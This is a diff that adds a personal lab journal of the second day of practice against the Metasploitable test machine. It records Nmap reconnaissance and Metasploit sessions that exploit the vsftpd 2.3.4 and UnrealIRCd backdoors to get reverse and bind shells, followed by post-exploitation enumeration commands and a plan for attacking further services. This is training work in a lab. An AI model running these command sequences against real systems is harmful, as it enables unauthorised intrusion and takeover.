@@ -1,0 +1,120 @@
+Day 2 — FTP (vsftpd) & IRC (UnrealIRCd) Exploitation
+⚙️ Lab Setup
+
+Organized folder structure on Kali for neat record-keeping:
+
+mkdir -p ~/labs/metasploitable/{scans,exploits,results}
+
+
+Purpose → keep scans, exploit logs, post-exploit results, and screenshots properly separated.
+
+🔍 Reconnaissance (Baseline Scan)
+
+Ran baseline Nmap scan:
+
+sudo nmap -sS -sV -O -Pn <TARGET> -oA metasploitable_initial
+
+
+Saved outputs:
+
+metasploitable_initial.nmap → human-readable
+
+metasploitable_initial.xml → machine-parseable
+
+metasploitable_initial.gnmap → grep-friendly
+
+💥 Exploit 1 — FTP (vsftpd 2.3.4 Backdoor)
+
+Recon:
+
+sudo nmap -sS -sV -p21 -Pn <TARGET> -oN scans/vsftpd-nmap.txt
+ftp <TARGET> 21   # checked for anonymous login
+
+
+Exploit (Metasploit):
+
+msfconsole
+spool exploits/vsftpd-session.txt
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS <TARGET>
+set RPORT 21
+set PAYLOAD cmd/unix/interact
+exploit
+spool off
+
+
+Post-Exploitation (saved to results/vsftpd-post.txt):
+
+whoami; id; uname -a; ps aux; netstat -tulpen; sudo -l; find / -perm -4000
+
+
+Result → Obtained a shell via the vsftpd backdoor.
+
+💥 Exploit 2 — IRC (UnrealIRCd 3.2.8.1 Backdoor)
+
+Recon:
+
+sudo nmap -sS -sV -p6667 -Pn <TARGET> -oN scans/unreal-nmap.txt
+nc -v <TARGET> 6667 > scans/unreal-banner.txt
+searchsploit unreal_ircd
+
+
+Exploitation (Metasploit):
+
+msfconsole
+spool exploits/unreal-session.txt
+use exploit/unix/irc/unreal_ircd_3281_backdoor
+set RHOSTS <TARGET>
+set RPORT 6667
+
+
+Reverse Shell payload
+
+set PAYLOAD cmd/unix/reverse
+set LHOST <KALI>
+set LPORT 4444
+exploit
+
+
+Bind Shell payload
+
+set PAYLOAD cmd/unix/bind_shell
+exploit
+
+
+Both payloads were tested successfully → reverse & bind shells obtained.
+
+Post-Exploitation (saved to results/unreal-post.txt):
+
+whoami; id; uname -a; ps aux; netstat -tulpen; sudo -l; find / -perm -4000
+
+
+Result → Full shell access to the target via IRC backdoor.
+
+📚 Lessons Learned (Day 2)
+
+Built a repeatable workflow: Recon → Enum → Exploit → Post-Exploit → Documentation.
+
+Understood difference between reverse payloads (attacker connects back) and bind payloads (attacker connects to target port).
+
+Practiced Linux privilege escalation checks (user, kernel info, running processes, open ports, SUID files).
+
+Achieved first stable remote shells via both FTP and IRC exploits 🎉.
+
+✅ End of Day 2: Multiple services successfully exploited (FTP, IRC) with both reverse and bind payloads tested. Logs, scans, and post-exploit outputs stored systematically.
+
+📌 Day 3 Plan: Continue exploitation of the remaining high-priority services:
+
+Tomcat (8080/8180) → manager deploy / WAR upload
+
+distcc (3632) → RCE PoC
+
+SSH (22) → default creds / key-based login
+
+Telnet (23) → plaintext creds
+
+SMB (139/445) → enum + writable shares
+
+VNC (5900) → weak password
+
+PostgreSQL (5432) → weak DB creds
